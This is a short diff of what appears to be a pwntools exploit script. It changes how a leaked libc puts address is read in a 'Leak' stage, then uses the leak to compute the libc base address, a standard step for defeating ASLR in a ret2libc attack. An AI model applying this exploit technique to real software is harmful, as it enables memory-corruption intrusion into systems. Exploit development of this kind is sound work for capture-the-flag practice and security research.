@@ -65,7 +65,7 @@ def crash(payload, stage):
     if stage == "Leak":
 
         # Receive leak
-        leak = u32(r.recv(6)[0:4])
+        leak = u32(r.recv(4))
 
         # Calculate offsets using leak
         LIBC_BASE = leak - LIBC_PUTS_OFFSET
